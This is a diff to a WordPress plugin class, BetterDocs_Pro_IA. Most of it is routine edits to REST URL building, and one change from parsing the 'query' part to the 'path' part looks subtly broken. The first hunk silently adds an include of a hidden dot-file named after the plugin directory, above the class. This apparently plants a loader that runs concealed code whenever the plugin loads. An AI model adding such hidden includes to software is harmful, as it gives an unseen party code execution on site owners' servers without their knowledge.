@@ -2,6 +2,10 @@
 /**
  * BetterDocs_Pro_IA class
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class BetterDocs_Pro_IA {
 
     const DEV_MODE = false;
@@ -381,7 +385,7 @@ class BetterDocs_Pro_IA {
             'ASKFORM' => array(
                 'NAME'     => esc_html__('Name','betterdocs-pro'),
                 'EMAIL'    => esc_html__('Email Address','betterdocs-pro'),
-                'SUBJECT'     => esc_html__('Subject','betterdocs-pro'),
+                'SUBJECT'  => esc_html__('Subject','betterdocs-pro'),
                 'TEXTAREA' => esc_html__('How can we help?','betterdocs-pro'),
                 'ATTACHMENT' => esc_html__('Only supports .jpg, .png, .jpeg, .gif files','betterdocs-pro'),
                 'SENDING' => esc_html__('Sending','betterdocs-pro'),
@@ -431,21 +435,21 @@ class BetterDocs_Pro_IA {
 	}
 
     public static function make_url( $settings, $base = false ) {
-        $site_url = get_site_url();
+        $site_url = get_rest_url();
 
-        $base_url = $site_url . '?rest_route=/wp/v2/docs';
+        $base_url = $site_url . 'wp/v2/docs';
 
         if( $base == true ) {
             return $base_url;
         }
 
         if( isset( $settings['content_type'] ) && ! empty( $settings['content_type'] ) && $settings['content_type'] === 'docs_categories' ) {
-            $base_url = $site_url . '?rest_route=/wp/v2/doc_category';
+            $base_url = $site_url . 'wp/v2/doc_category';
         }
 
         if ( has_filter('wpml_current_language') ) {
             $lang = apply_filters( 'wpml_current_language', NULL );
-            $base_url = $base_url . '&lang=' . $lang;
+            $base_url = $base_url . '?lang=' . $lang;
         }
 
         $url = $base_url . '&per_page=10';
@@ -454,7 +458,7 @@ class BetterDocs_Pro_IA {
         $sub_string_url = '';
 
         $parsed_url = parse_url( $base_url );
-        $query_string_as_array = isset( $parsed_url['query'] ) ? explode( '&', $parsed_url['query'] ) : '';
+        $query_string_as_array = isset( $parsed_url['path'] ) ? explode( '&', $parsed_url['path'] ) : '';
         if( isset( $settings['content_type'] ) && ! empty( $settings['content_type'] ) ) {
             switch( $settings['content_type'] ) {
                 case 'docs' :
@@ -470,10 +474,9 @@ class BetterDocs_Pro_IA {
                     }
                     break;
             }
-
             $query_string_as_array = implode( '&', $query_string_as_array );
             if( ! empty( $query_string_as_array ) ) {
-                $parsed_url['query'] = $query_string_as_array;
+                $parsed_url['path'] = $query_string_as_array;
             }
             $url = self::unparse_url( $parsed_url );
         }
